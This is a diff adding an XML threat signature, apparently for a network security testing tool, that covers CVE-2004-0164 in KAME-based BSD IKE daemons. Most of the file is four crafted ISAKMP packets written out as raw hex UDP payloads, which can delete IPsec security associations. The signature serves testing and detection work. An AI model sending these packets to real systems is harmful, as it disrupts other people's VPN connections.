@@ -1,0 +1,122 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="KAME IKE racoon HASH"/>
+    <EngDesc display="true" value="The IKE daemon of some BSD systems (OpenBSD&amp;apos;s isakmpd, NetBSD&amp;apos;s raccoon) has a vulnerability where sending specifically crafted IKE packets could remove an IPsec SA or all SAs."/>
+    <Intent display="true"/>
+    <Protocol display="true" value="ISAKMP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="KAME_project"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="KAME_project_KAME_project_NetBSD"/>
+      <item value="KAME_project_KAME_project_OpenBSD"/>
+      <item value="KAME_project_KAME_project_FreeBSD"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="KAME_project_NetBSD_1.6.1"/>
+      <item value="KAME_project_OpenBSD_3.4"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="FSC20040220-01"/>
+    <CVEID display="true" value="CVE-2004-0164"/>
+    <bugtraqID display="true" value="9416"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="ThreatEx Team"/>
+    <ID display="true" value="26f88da5ba14a3b36f57fbb170e33a1e"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="True"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value=""/>
+    <Authentication display="false" value=""/>
+    <ConfImpact display="false" value=""/>
+    <IntegImpact display="false" value=""/>
+    <AvailImpact display="false" value=""/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value="normal"/>
+    <LastModified display="false" value="633615872117500000"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value="B"/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value=""/>
+    <Created value="1213725119" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="E"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="F"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="G"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="H"/>
+    <NamedVar name="ISAKMPdestPort" type="ImperfectControls.Port" value="null" index="I"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="E"/>
+      <for index="F"/>
+      <for index="G"/>
+      <for index="H"/>
+      <for index="I"/>
+      <for index="M" range="srcPort"/>
+    </for>
+    <for index="B">
+      <for index="E"/>
+      <for index="F"/>
+      <for index="G"/>
+      <for index="H"/>
+      <for index="I"/>
+      <for index="K" range="srcPort"/>
+    </for>
+    <for index="C">
+      <for index="E"/>
+      <for index="F"/>
+      <for index="G"/>
+      <for index="H"/>
+      <for index="I"/>
+      <for index="J" range="srcPort"/>
+    </for>
+    <for index="D">
+      <for index="E"/>
+      <for index="F"/>
+      <for index="G"/>
+      <for index="H"/>
+      <for index="I"/>
+      <for index="L" range="srcPort"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="" Identification="8215" FragmentOffset="0000" TTL="F5" Protocol="11" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="false" MF="false">
+        <UDP srcPort="@range(1026,65535)" destPort="$ISAKMPdestPort" checksum="" length="" Payload="171717171717171700000000000000000110020000000000000000480000002C00000001000000010000002001010001000000180001000080010005800200028003000180040002"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="B" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="" Identification="8215" FragmentOffset="0000" TTL="F5" Protocol="11" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="false" MF="false">
+        <UDP srcPort="@range(1026,65535)" destPort="$ISAKMPdestPort" checksum="" length="" Payload="171717171717171700000000000000000810050000000000000000300C000004000000100000000103040001B6DF84B2"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="C" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="" Identification="8215" FragmentOffset="0000" TTL="F5" Protocol="11" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="false" MF="false">
+        <UDP srcPort="@range(1026,65535)" destPort="$ISAKMPdestPort" checksum="" length="" Payload="171717171717171700000000000000000B10050000000000000000280000000C0000000101006002"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="D" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="" Identification="8215" FragmentOffset="0000" TTL="F5" Protocol="11" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="false" MF="false">
+        <UDP srcPort="@range(1026,65535)" destPort="$ISAKMPdestPort" checksum="" length="" Payload="171717171717171700000000000000000110020000000000000000540B00002C000000010000000100000020010100010000001801010000800100058002000280030003800400020000000C0000000101006002"/>
+      </IP>
+    </Ethernet>
+  </Output>
+</threatSignature>
